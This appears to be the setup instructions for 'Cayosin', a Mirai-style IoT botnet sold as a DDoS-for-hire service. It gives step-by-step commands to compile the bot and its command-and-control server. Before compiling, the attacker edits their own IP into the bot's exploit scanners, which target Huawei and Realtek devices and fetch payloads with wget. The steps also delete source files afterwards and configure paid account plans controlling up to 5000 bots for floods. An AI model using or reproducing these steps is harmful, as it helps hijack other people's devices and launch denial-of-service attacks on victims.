yum update -y; yum install wget python gcc nano screen httpd php -y; service httpd start; ulimit -n 999999

nano /usr/include/bits/typesizes.h

if '#define __FD_SETSIZE' is set to 1024, change it to 99999, otherwise CTRL + X to quit

change ips in:
- /bot/main.c
- /bot/huawei_scanner.c search for 'wget'
- /bot/realtek... .c search for 'wget'
- /CayosinCNC.c look for iplookup and change the ip there

gcc bot/*.c -o bp -pthread; python Cayosin.py fff 179.43.154.140  cayosin; rm -rf bot; mv iplookup.php /var/www/html

gcc -o cnc CayosinCNC.c -pthread; rm -rf CayosinCNC.c; rm -rf Cayosin.py; rm -rf cross-compiler-*

*You have the ability to make each account admin/superadmin/common.
"admin" Gives the ability to add/kick users and force unmute all clients. 
"superadmin" Gives all regular admin abilities, as well as IP Ban/Unban.
"common" Only allows the sending of floods, use of Tools and Server Commands.

*You must also select their bot plan.
"noob" gives control over 0 bots
"plan1" gives control over 100 bots
"plan2" gives control over 1000 bots
"plan3" gives control over 5000 bots
"all" gives them control over all bots

And their Plan Expiry Date (Format: 00/00/0000) (day/month/year)

nano logins.txt

YOUR_USERNAME YOUR_PASSWORD superadmin all 30/12/9999

screen ./cnc 420 850

hold down CTRL, then hold down A and then press D

CNC port = 65525, protocol = RAW

cmd to add a user:

adduser spotuser spotpass superadmin all 13/04/2022
